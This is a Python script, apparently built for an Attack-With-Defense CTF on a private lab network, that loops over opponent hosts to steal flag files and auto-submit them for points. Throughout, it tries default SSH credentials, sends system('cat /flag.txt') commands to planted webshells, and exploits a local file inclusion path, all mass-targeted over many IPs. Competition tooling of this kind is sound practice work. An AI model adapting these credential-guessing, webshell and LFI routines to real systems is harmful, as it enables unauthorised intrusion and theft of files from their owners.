import paramiko
import concurrent.futures
import os
import re
import requests
import json
import urllib3
import time
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from tqdm import tqdm

# 禁用 SSL 警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class AWDConfig:
    def __init__(self):
        self.config = {
            'awd_mappings': {
                '6': ['172.16.20.4','172.16.20.6','172.16.20.9','172.16.20.30','172.16.20.32','172.16.20.36'],
                '2': ['172.16.20.82','172.16.20.83','172.16.20.84','172.16.20.87','172.16.20.93','172.16.20.95','172.16.20.97'],
                '8': ['172.16.20.140','172.16.20.142','172.16.20.144','172.16.20.146','172.16.20.147','172.16.20.241'],
                '5': ['172.16.20.35','172.16.20.39','172.16.20.161','172.16.20.162','172.16.20.163','172.16.20.166','172.16.20.169'],
                '4': ['172.16.20.132','172.16.20.133','172.16.20.190','172.16.20.240','172.16.20.244','172.16.20.246','172.16.20.136']
            },
            'awd_id_5_ips': ['172.16.20.161','172.16.20.162','172.16.20.166','172.16.20.169','172.16.20.163',
                            '172.16.20.167','172.16.20.164','172.16.20.165','172.16.20.160','172.16.20.39',
                            '172.16.20.35','172.16.20.38','172.16.20.34'],
            'awd_id_4_ips': ['172.16.20.132','172.16.20.133','172.16.20.137','172.16.20.136','172.16.20.131',
                            '172.16.20.190','172.16.20.240','172.16.20.244','172.16.20.246','172.16.20.242',
                            '172.16.20.243','172.16.20.245','172.16.20.247'],
            'awd_id_8_ips': ['172.16.20.241','172.16.20.98','172.16.20.99','172.16.20.142','172.16.20.141',
                            '172.16.20.144','172.16.20.147','172.16.20.146','172.16.20.143','172.16.20.145',
                            '172.16.20.140','172.16.20.219','172.16.20.148'],
            'target_username': ['elab', 'ctf'],
            'target_password': ['ilikeawd'],  # 支持多个密码
            'sessionid': '',  # 填你的sessionid（自己抓包找）
            'username': '',  # 填你的学号
            'system_config': {
                'timeout': 5,
                'threads': 20,
                'output_dir': './flags',
                'flags_file': 'flags.txt',
                'last_flags_file': 'last_flags.json',
                'submit_url': 'https://172.16.20.1/competitionCyberRange/api/v1/awd_answer/get_commit_flag/',
                'sleep_interval': 180  # 每轮检查之间的休息时间（秒）
            }
        }
    
    def update_awd_mapping(self, awd_id: str, ip_list: List[str]):
        """更新 AWD ID 和 IP 的映射关系"""
        self.config['awd_mappings'][awd_id] = ip_list
    
    def get_all_ips(self) -> List[str]:
        """获取所有配置的 IP 地址"""
        all_ips = []
        for ip_list in self.config['awd_mappings'].values():
            all_ips.extend(ip_list)
        return list(set(all_ips))  # 去重
    
    def get_awd_id_for_ip(self, ip: str) -> int:
        """根据 IP 获取对应的 AWD ID"""
        # 首先检查awd_id_5_ips
        if ip in self.config['awd_id_5_ips']:
            return 5
        # 然后检查awd_id_4_ips
        if ip in self.config['awd_id_4_ips']:
            return 4
        # 检查awd_id_8_ips
        if ip in self.config['awd_id_8_ips']:
            return 8
        # 最后检查awd_mappings
        for awd_id, ip_list in self.config['awd_mappings'].items():
            if ip in ip_list:
                return int(awd_id)
        return None

class AWDFlagCollector:
    def __init__(self):
        self.config = AWDConfig()
        
    def extract_flag_content(self, content: str) -> str:
        """从内容中提取flag{xxx}格式的内容"""
        matches = re.findall(r'flag{[^}]*}', content)
        return matches[0] if matches else None
    
    def download_flag(self, ip: str) -> tuple:
        """从单个主机下载flag.txt文件，支持多用户名和多密码尝试"""
        usernames = self.config.config['target_username']
        passwords = self.config.config['target_password']
        
        if not isinstance(usernames, list):
            usernames = [usernames]
        if not isinstance(passwords, list):
            passwords = [passwords]
            
        last_error = None
        for username in usernames:
            for pwd in passwords:
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(ip, 
                                username=username, 
                                password=pwd, 
                                timeout=self.config.config['system_config']['timeout'])
                    sftp = ssh.open_sftp()
                    remote_path = "/flag.txt"
                    local_path = os.path.join(self.config.config['system_config']['output_dir'], 
                                            f"{ip.replace('.', '_')}_flag.txt")
                    sftp.get(remote_path, local_path)
                    sftp.close()
                    ssh.close()
                    return (ip, True, local_path, None)
                except Exception as e:
                    last_error = str(e)
        return (ip, False, None, last_error)
    
    def submit_flag(self, flag: str, ip: str) -> List[dict]:
        """提交单个flag到对应的awd_id"""
        awd_id = self.config.get_awd_id_for_ip(ip)
        if not awd_id:
            return [{"error": f"未找到IP {ip} 对应的AWD ID"}]

        json_data = {
            'awd_id': awd_id,
            'username': self.config.config['username'],
            'flag': flag,
        }

        try:
            response = requests.post(
                self.config.config['system_config']['submit_url'],
                cookies={'sessionid': self.config.config['sessionid']},
                json=json_data,
                verify=False
            )
            return [response.json()]
        except Exception as e:
            return [{"error": str(e)}]
    
    def read_last_flags(self) -> dict:
        """读取上一次的flag记录"""
        try:
            flags_file = os.path.join(
                self.config.config['system_config']['output_dir'],
                self.config.config['system_config']['last_flags_file']
            )
            if os.path.exists(flags_file):
                with open(flags_file, 'r', encoding='utf-8') as f:
                    return json.load(f)
        except Exception as e:
            print(f"读取上一次flag记录失败: {str(e)}")
        return {}
    
    def save_last_flags(self, flags_dict: dict):
        """保存当前的flag记录"""
        try:
            flags_file = os.path.join(
                self.config.config['system_config']['output_dir'],
                self.config.config['system_config']['last_flags_file']
            )
            with open(flags_file, 'w', encoding='utf-8') as f:
                json.dump(flags_dict, f, ensure_ascii=False, indent=2)
        except Exception as e:
            print(f"保存flag记录失败: {str(e)}")
    
    def get_score(self) -> Optional[Tuple[int, int]]:
        """
        获取队伍比赛分数和排名
        
        Returns:
            Tuple[int, int]: 包含(分数, 排名)的元组，如果请求失败则返回None
        """
        try:
            response = requests.get(
                'https://172.16.20.1/competitionCyberRange/api/v1/awd_answer/get_team_score/',
                cookies={'sessionid': self.config.config['sessionid']},
                verify=False,
                timeout=10
            )
            
            # 检查响应状态码
            response.raise_for_status()
            
            # 尝试解析JSON响应
            result = response.json()
            if result.get('suc'):
                msg = result.get('msg', {})
                return msg.get('score'), msg.get('team_rank')
            return None
            
        except requests.exceptions.RequestException as e:
            print(f"获取分数请求发生错误: {str(e)}")
            return None
        except json.JSONDecodeError as e:
            print(f"获取分数JSON解析错误: {str(e)}")
            return None
        except Exception as e:
            print(f"获取分数发生未知错误: {str(e)}")
            return None
    
    def getFlag3(self) -> Dict[str, str]:
        """
        通过webshell方式获取AWD ID 5的flag
        :return: 包含IP和对应flag的字典
        """
        def extract_flag(text: str) -> str:
            flag_pattern = r'flag{[^}]*}'
            match = re.search(flag_pattern, text)
            return match.group(0) if match else "没有找到flag"

        result = {}
        # 使用AWD ID 5专用的IP列表
        target_ips = self.config.config['awd_id_5_ips']
        
        print("\n=== 开始使用AWD ID 5对应的漏洞POC获取flag ===")
        for ip in target_ips:
            try:
                response = requests.post(
                    f'http://{ip}/search/.webshell.php',
                    data={'cmd': 'system("cat /flag.txt");'},
                    verify=False
                )
                flag = extract_flag(response.text.strip())
                if flag != "没有找到flag":
                    print(f"[✓] {ip}: 获取成功 -> {flag}")
                else:
                    print(f"[✗] {ip}: 获取失败 -> {flag}")
                result[ip] = flag
            except Exception as e:
                print(f"[✗] {ip}: 获取失败 -> Error: {str(e)}")
                result[ip] = f"Error: {str(e)}"
        print("=== AWD ID 5漏洞POC获取flag结束 ===\n")
        return result

    def getFlag4(self) -> Dict[str, str]:
        """
        通过LFI漏洞获取AWD ID 4的flag
        :return: 包含IP和对应flag的字典
        """
        def extract_flag(text: str) -> str:
            flag_pattern = r'flag{[^}]*}'
            match = re.search(flag_pattern, text)
            return match.group(0) if match else "没有找到flag"

        result = {}
        # 使用AWD ID 4专用的IP列表
        target_ips = self.config.config['awd_id_4_ips']
        
        print("\n=== 开始使用AWD ID 4对应的漏洞POC获取flag ===")
        for ip in target_ips:
            try:
                response = requests.get(
                    f'http://{ip}/Data/inclsion/lfi.php?file=/flag.txt',
                    verify=False
                )
                flag = extract_flag(response.text.strip())
                if flag != "没有找到flag":
                    print(f"[✓] {ip}: 获取成功 -> {flag}")
                else:
                    print(f"[✗] {ip}: 获取失败 -> {flag}")
                result[ip] = flag
            except Exception as e:
                print(f"[✗] {ip}: 获取失败 -> Error: {str(e)}")
                result[ip] = f"Error: {str(e)}"
        print("=== AWD ID 4漏洞POC获取flag结束 ===\n")
        return result

    def getFlag8(self) -> Dict[str, str]:
        """
        通过.test.php漏洞获取AWD ID 8的flag
        :return: 包含IP和对应flag的字典
        """
        def extract_flag(text: str) -> str:
            flag_pattern = r'flag{[^}]*}'
            match = re.search(flag_pattern, text)
            return match.group(0) if match else "没有找到flag"

        result = {}
        # 使用AWD ID 8专用的IP列表
        target_ips = self.config.config['awd_id_8_ips']
        
        print("\n=== 开始使用AWD ID 8对应的漏洞POC获取flag ===")
        for ip in target_ips:
            try:
                response = requests.post(
                    f'http://{ip}/.test.php',
                    data={'x': "system('cat /flag.txt')"},
                    verify=False
                )
                flag = extract_flag(response.text.strip())
                if flag != "没有找到flag":
                    print(f"[✓] {ip}: 获取成功 -> {flag}")
                else:
                    print(f"[✗] {ip}: 获取失败 -> {flag}")
                result[ip] = flag
            except Exception as e:
                print(f"[✗] {ip}: 获取失败 -> Error: {str(e)}")
                result[ip] = f"Error: {str(e)}"
        print("=== AWD ID 8漏洞POC获取flag结束 ===\n")
        return result

    def run(self):
        """运行主程序"""
        # 创建输出目录
        os.makedirs(self.config.config['system_config']['output_dir'], exist_ok=True)
        
        print("=== 开始监控flag ===")
        
        while True:
            print("\n=== 开始扫描主机 ===")
            success_count = 0
            current_flags = {}
            
            # 获取webshell方式的flag
            webshell_flags = self.getFlag3()
            current_flags.update(webshell_flags)
            
            # 获取LFI方式的flag
            lfi_flags = self.getFlag4()
            current_flags.update(lfi_flags)
            
            # 获取.test.php方式的flag
            test_php_flags = self.getFlag8()
            current_flags.update(test_php_flags)
            
            # 并发下载flag（只使用SSH方式）
            with concurrent.futures.ThreadPoolExecutor(
                max_workers=self.config.config['system_config']['threads']
            ) as executor:
                # 获取所有需要SSH的IP（排除AWD ID 4、5和8的IP）
                ssh_ips = [ip for ip in self.config.get_all_ips() 
                          if ip not in self.config.config['awd_id_5_ips'] 
                          and ip not in self.config.config['awd_id_4_ips']
                          and ip not in self.config.config['awd_id_8_ips']]
                results = executor.map(self.download_flag, ssh_ips)
                
                for ip, status, file_path, error in results:
                    if status and file_path:
                        try:
                            with open(file_path, 'r', encoding='utf-8') as f:
                                content = f.read().strip()
                                flag_content = self.extract_flag_content(content)
                                if flag_content:
                                    print(f"[✓] {ip}: 获取成功 -> {flag_content}")
                                    current_flags[ip] = flag_content
                                else:
                                    print(f"[✗] {ip}: 获取失败 -> 没有找到flag")
                        except Exception as e:
                            print(f"[✗] {ip}: 获取失败 -> Error: {str(e)}")
                    else:
                        print(f"[✗] {ip}: 获取失败 -> Error: {error}")

            # 读取上一次的flag记录
            last_flags = self.read_last_flags()
            
            # 检查是否有新的flag
            new_flags = {}
            for ip, flag in current_flags.items():
                if ip not in last_flags or last_flags[ip] != flag:
                    new_flags[ip] = flag
            
            if new_flags:
                print("\n=== 发现新的flag，开始提交 ===")
                for ip, flag in new_flags.items():
                    print(f"\n正在提交 {ip} 的flag...")
                    results = self.submit_flag(flag, ip)
                    for result in results:
                        print(f"提交结果: {json.dumps(result, ensure_ascii=False, indent=2)}")
                
                # 保存当前的flag记录
                self.save_last_flags(current_flags)
            else:
                print("\n=== 没有发现新的flag，等待下一轮检查 ===")
            
            # 获取当前分数和排名
            score_result = self.get_score()
            if score_result:
                score, rank = score_result
                print(f"\n=== 当前分数: {score} ===")
                print(f"=== 当前排名: {rank} ===")
            
            print(f"\n=== 本轮结束，当前时间：{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===")
            
            # 使用tqdm显示等待进度
            sleep_interval = self.config.config['system_config']['sleep_interval']
            for _ in tqdm(range(sleep_interval), desc="", unit="秒", bar_format="{desc}{remaining}"):
                time.sleep(1)

if __name__ == "__main__":
    # 直接创建并运行收集器
    collector = AWDFlagCollector()
    collector.run() 